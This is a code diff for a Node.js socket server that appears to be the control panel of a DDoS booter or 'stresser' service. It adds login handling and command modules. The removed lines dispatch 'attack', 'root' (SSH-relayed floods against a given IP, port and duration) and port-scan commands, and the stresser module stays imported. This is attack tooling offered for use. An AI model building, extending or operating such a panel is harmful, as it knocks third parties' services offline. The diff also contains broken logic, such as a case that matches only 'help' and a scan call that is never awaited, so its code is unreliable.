@@ -32,7 +32,12 @@ const roots = require("./assets/root_system/main.js");
 
 
 // Command Files
+const Help = require("./assets/Commands/help.js");
+const Geo = require("./assets/Commands/geo.js");
 const Stresser = require("./assets/Commands/stresser.js");
+const root = require("./assets/Commands/root.js");
+const Scan = require("./assets/Commands/scan.js");
+
 
 /*
 *
@@ -54,11 +59,11 @@ Server.Server.on('connection', async function(socket) {
 
     let username = await getInput(socket, "Username: ");
     let password = await getInput(socket, "Password: ");
-    let login_run = await Auth.Login(username, password, CurrentIP);
+    let login_run = await Auth.login(username, password, CurrentIP);
     socket.write(login_run + "\r\n");
-    if(login_run === "[x] Error, Failed") {
-        socket.write("Killing in 3 seconds.....\r\n")
-        Extra.sleep(5000).then(() => {
+    if(login_run.includes("[x]")) {
+        socket.write("Closing in 5 seconds.....\r\n");
+        await Extra.sleep(5000).then(() => {
             socket.destroy();  
         })
     }
@@ -85,32 +90,22 @@ Server.Server.on('connection', async function(socket) {
 * Command Handling
 *
 */
-        if(cleanSTR.startsWith("clear")) {
-            socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
-        } else if(cleanSTR.startsWith("banner")) {
-            socket.write(Banner.ModifyBanner("main") + "\r\n");
-        } else if(cleanSTR.startsWith("help" || "?")) {
-            socket.write(Banner.ModifyBanner("help"));
-        } else if(cleanSTR.startsWith("geo")) {
-            socket.write(await Extra.GeoIP(Current.CurrentCmd.arg[1]));
-        } else if(cleanSTR.startsWith("root")) { 
-            let lul = roots.SendSSHCmd(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4])
-            socket.write("            Attack sent to: " + Current.CurrentCmd.arg[1] + ":" + Current.CurrentCmd.arg[2] + " for " + Current.CurrentCmd.arg[3] + " seconds with " + Current.CurrentCmd.arg[4] + "\r\n");
-        } else if(cleanSTR.startsWith("stress")) {
-            Stresser.Stresser(socket);
-            // let gay = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4], "root");
-            // socket.write(gay);
-        } else if(cleanSTR.startsWith("scan")) {
-            socket.write(await Extra.pScan(Current.CurrentCmd.arg[1]));
-        } else if(cleanSTR.startsWith("attack")) {
-            console.log(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4]);
-            let attacking = await Extra.send_attack(Current.CurrentCmd.arg[1], Current.CurrentCmd.arg[2], Current.CurrentCmd.arg[3], Current.CurrentCmd.arg[4]);
-            socket.write(Banner.ModifyBanner("main") + attacking + "\r\n");
+
+
+        switch(Current.CurrentCmd.Cmd) {
+            case "help" || "?":
+                Help.help_func(socket);
+                return;
+            case "clear" || "cls":
+                socket.write(Config.Colors.Clear + Banner.ModifyBanner("main") + "\r\n");
+                return;
+            case "geo":
+                Geo.GeoIP(socket);
+                return;
+            case "pscan":
+                socket.write(Extra.pScan(Current.CurrentCmd.arg[1]));
         }
-// Outputing hostname and positioning cursor
-        socket.write("\r\n" + Banner.ModifyBanner("hostname"));
-        Extra.MoveCursorToLeft(31, socket);
-        Extra.MoveCursorUp(1, socket);
+        // Outputing hostname and positioning cursor
     });
 
     socket.on('end', function() {
